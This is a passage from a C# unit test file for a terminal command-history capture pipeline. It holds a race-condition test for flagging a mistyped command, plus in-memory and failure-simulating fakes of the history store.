        await pipeline.HandleShellIntegrationEventAsync(Accepted("git status"));
        Assert.Equal(CommandCaptureSource.ShellIntegration, Assert.Single(store.Entries).Source);
    }

    /// <summary>
    /// The completion releases the entry before its append lands, so a classification that follows
    /// the completion has to wait for that append too.
    /// </summary>
    [Fact]
    public async Task MarkLastCommandInvalidAsync_WhileTheCompletedEntryIsStillBeingAppended_FlagsIt()
    {
        (CapturePipeline pipeline, InMemoryHistoryStore store, _) = CreatePipeline();
        TaskCompletionSource heldAppend = store.HoldAppends();

        Task capture = pipeline.CaptureSubmissionAsync("gti status", isSubmissionSuppressed: false);
        Task finish = pipeline.CompleteSubmissionAsync(1);
        Task mark = pipeline.MarkLastCommandInvalidAsync();

        heldAppend.SetResult();
        await capture;
        await finish;
        await mark;

        Assert.True(Assert.Single(store.Entries).IsInvalidCommand);
    }

    private static (CapturePipeline Pipeline, InMemoryHistoryStore Store, AssistSessionContext Context) CreatePipeline()
    {
        var store = new InMemoryHistoryStore();
        var context = new AssistSessionContext();
        return (new CapturePipeline(store, new SecretsFilter(), context), store, context);
    }

    private static ShellIntegrationEvent Accepted(string? commandText, string? workingDirectory = null)
    {
        return new ShellIntegrationEvent(
            Type: ShellIntegrationEventType.CommandAccepted,
            Timestamp: EventTime,
            CommandText: commandText,
            WorkingDirectory: workingDirectory,
            ExitCode: null,
            Duration: null);
    }

    private static ShellIntegrationEvent Finished(int? exitCode, TimeSpan? duration)
    {
        return new ShellIntegrationEvent(
            Type: ShellIntegrationEventType.CommandFinished,
            Timestamp: EventTime.AddSeconds(1),
            CommandText: null,
            WorkingDirectory: null,
            ExitCode: exitCode,
            Duration: duration);
    }

    private sealed class InMemoryHistoryStore : IHistoryStore
    {
        /// <summary>
        /// Serializes every read-modify-write of <see cref="_entries"/>. A completion and a Fix
        /// classification waiting on the same held append resume on separate thread-pool threads,
        /// and each replaces the entry it read - unlocked, one could restore what the other wrote.
        /// </summary>
        private readonly object _sync = new();
        private readonly List<CommandHistoryEntry> _entries = new();
        private readonly List<string> _patchedEntryIds = new();
        private readonly List<string> _firstTokenSweeps = new();

        public IReadOnlyList<CommandHistoryEntry> Entries => _entries;
        public IReadOnlyList<string> PatchedEntryIds => _patchedEntryIds;

        /// <summary>Every first-token sweep the pipeline asked for, in order.</summary>
        public IReadOnlyList<string> FirstTokenSweeps => _firstTokenSweeps;

        private TaskCompletionSource? _heldAppend;
        private bool _recordHeldAppendEvenIfItFails;

        /// <summary>
        /// Makes the next append - only the next one - wait until the returned source completes, and
        /// fail if it faults: an append held in flight, the window the completion race lives in.
        /// </summary>
        /// <remarks>
        /// Continuations run inline on the thread that completes the source, so the test thread
        /// decides exactly when the held append lands.
        /// </remarks>
        /// <param name="recordEvenIfItFails">
        /// Store the entry before rethrowing a fault, as <c>JsonlHistoryStore</c> does when the write
        /// succeeded but the compaction after it threw.
        /// </param>
        public TaskCompletionSource HoldAppends(bool recordEvenIfItFails = false)
        {
            _heldAppend = new TaskCompletionSource();
            _recordHeldAppendEvenIfItFails = recordEvenIfItFails;
            return _heldAppend;
        }

        public async Task AppendAsync(CommandHistoryEntry entry, CancellationToken cancellationToken = default)
        {
            TaskCompletionSource? held = _heldAppend;
            _heldAppend = null;
            if (held != null)
            {
                try
                {
                    await held.Task;
                }
                catch when (_recordHeldAppendEvenIfItFails)
                {
                    Upsert(entry);
                    throw;
                }
            }

            Upsert(entry);
        }

        /// <summary>
        /// Last write wins per id, like the real store's load rule: a record that reuses an id
        /// supersedes the one before it.
        /// </summary>
        private void Upsert(CommandHistoryEntry entry)
        {
            lock (_sync)
            {
                int index = _entries.FindIndex(x => x.Id == entry.Id);
                if (index < 0)
                {
                    _entries.Add(entry);
                }
                else
                {
                    _entries[index] = entry;
                }
            }
        }

        public Task ClearAsync(CancellationToken cancellationToken = default)
        {
            lock (_sync)
            {
                _entries.Clear();
                return Task.CompletedTask;
            }
        }

        public Task<IReadOnlyList<CommandHistoryEntry>> GetRecentAsync(int maxResults, CancellationToken cancellationToken = default)
            => Task.FromResult<IReadOnlyList<CommandHistoryEntry>>(_entries.Take(maxResults).ToList());

        public Task<IReadOnlyList<CommandHistoryEntry>> SearchAsync(string query, int maxCandidates, CancellationToken cancellationToken = default)
            => Task.FromResult<IReadOnlyList<CommandHistoryEntry>>(_entries.Take(maxCandidates).ToList());

        public Task<bool> TryMarkInvalidCommandAsync(string entryId, CancellationToken cancellationToken = default)
        {
            lock (_sync)
            {
                int index = _entries.FindIndex(x => x.Id == entryId);
                if (index < 0)
                {
                    return Task.FromResult(false);
                }

                _entries[index] = _entries[index] with { IsInvalidCommand = true };
                return Task.FromResult(true);
            }
        }

        public Task<int> TryMarkInvalidCommandsByFirstTokenAsync(string firstToken, CancellationToken cancellationToken = default)
        {
            lock (_sync)
            {
                _firstTokenSweeps.Add(firstToken);

                int flagged = 0;
                for (int i = 0; i < _entries.Count; i++)
                {
                    if (_entries[i].IsInvalidCommand ||
                        !string.Equals(
                            CommandHistoryEntry.FirstToken(_entries[i].CommandText),
                            firstToken,
                            StringComparison.OrdinalIgnoreCase))
                    {
                        continue;
                    }

                    _entries[i] = _entries[i] with { IsInvalidCommand = true };
                    flagged++;
                }

                return Task.FromResult(flagged);
            }
        }

        public Task<bool> TryUpdateExecutionResultAsync(string entryId, int? exitCode, long? durationMs, bool isInvalidCommand = false, CancellationToken cancellationToken = default)
        {
            lock (_sync)
            {
                int index = _entries.FindIndex(x => x.Id == entryId);
                if (index < 0)
                {
                    return Task.FromResult(false);
                }

                _patchedEntryIds.Add(entryId);
                _entries[index] = _entries[index] with
                {
                    ExitCode = exitCode,
                    DurationMs = durationMs ?? _entries[index].DurationMs,

                    // Latching, like the real store: see IHistoryStore.TryUpdateExecutionResultAsync.
                    IsInvalidCommand = _entries[index].IsInvalidCommand || isInvalidCommand
                };
                return Task.FromResult(true);
            }
        }
    }

    private sealed class ThrowingHistoryStore : IHistoryStore
    {
        public Task AppendAsync(CommandHistoryEntry entry, CancellationToken cancellationToken = default)
            => Task.FromException(new InvalidOperationException("simulated write failure"));

        public Task ClearAsync(CancellationToken cancellationToken = default) => Task.CompletedTask;

        public Task<IReadOnlyList<CommandHistoryEntry>> GetRecentAsync(int maxResults, CancellationToken cancellationToken = default)
            => Task.FromResult<IReadOnlyList<CommandHistoryEntry>>(Array.Empty<CommandHistoryEntry>());

        public Task<IReadOnlyList<CommandHistoryEntry>> SearchAsync(string query, int maxResults, CancellationToken cancellationToken = default)
            => Task.FromResult<IReadOnlyList<CommandHistoryEntry>>(Array.Empty<CommandHistoryEntry>());

        public Task<bool> TryMarkInvalidCommandAsync(string entryId, CancellationToken cancellationToken = default)
            => Task.FromResult(false);

        public Task<int> TryMarkInvalidCommandsByFirstTokenAsync(string firstToken, CancellationToken cancellationToken = default)
            => Task.FromException<int>(new InvalidOperationException("simulated write failure"));

        public Task<bool> TryUpdateExecutionResultAsync(string entryId, int? exitCode, long? durationMs, bool isInvalidCommand = false, CancellationToken cancellationToken = default)
            => Task.FromException<bool>(new InvalidOperationException("simulated write failure"));
    }
}
